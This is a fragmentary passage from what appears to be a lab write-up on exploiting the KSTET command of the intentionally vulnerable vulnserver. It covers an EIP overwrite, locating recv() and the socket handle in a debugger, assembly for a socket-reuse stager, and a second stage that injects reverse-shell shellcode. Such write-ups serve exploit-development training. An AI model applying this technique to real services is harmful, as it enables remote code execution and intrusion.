...
link:../vulnserver-gter-noegghunter/[WinSocket stack reuse].
...
Now, select the match on where `KSTET` string is presented and put a
breakpoint:
...
Wonderful! We now exactly how to overwrite `EIP` to get control over the
execution flow.
...
We first we need to know 2 things:

. The address of the `recv()` call in the system.
. The value of the socket handle.

To do that, we can use the debugger again, by right clicking, selecting
`Search for`, then `All intermodular calls`, look for the call to
`WS2_32.recv` and put a breakpoint:

image::recv1.gif[recv() call location]

Now create a new connection. When we hit the breakpoint we will be able
to check the address of the `recv()` call and the value of the socket handle:

image::recv2.gif[recv() call]

Wonderful! We can see the parameters on the stack window (bottom right)
on where we can get the value of the socket handle (`144`). We also got the
address of the `recv()` function at `0040252C`.
...
push ebx                ; Push `*buf` parameter = Pointer to ESP
xor ebx,ebx             ; Zero out EBX again
add ebx,0x144           ; Make EBX = 144 that is the value of socket handle
push ebx                ; Push `s` parameter = 144
mov eax,40252C41        ; We need to make EAX = 0040252C but we can't inject
                        ; null bytes. So 40252C41 is shift-left padded
shr eax,0x8             ; Remove the '41' byte of EAX by shifting right and
                        ; making EBX = 0040252C
call eax                ; Call recv()
----
...
jnz socket_loop         ; If recv() failed kump back to the socket loop where
...
== Stage 2: Injecting reverse shellcode
...
. We created a `STAGE2` variable with the shellcode padded the rest of
the 1024 bytes with NOPs (`\x90`)
. We added a `time.sleep(3)` to wait for the brute force to get the socket handle
...
Beautiful! As you can see, the shellcode was injected below or execution flow
...
2 stage exploitation is a very cool method to use the available bytes to
